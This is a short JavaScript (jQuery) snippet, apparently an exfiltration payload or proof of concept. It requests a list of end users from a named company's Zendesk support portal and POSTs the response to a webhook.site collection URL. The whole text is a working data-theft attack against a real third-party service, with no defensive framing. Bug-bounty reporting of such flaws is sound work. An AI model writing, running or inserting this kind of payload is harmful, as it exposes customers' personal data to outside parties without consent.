$.ajax('https://cookiebot.zendesk.com/users?location=lotus&page=1&role=0&route=end_users').done(function(data) { 
	$.ajax({
	  type: "POST",
	  url: 'https://webhook.site/44d76cef-001d-4ce1-88b3-7737bca7bdb5',
	  data: data,
	  success: function() { console.log('done'); }
	});
})
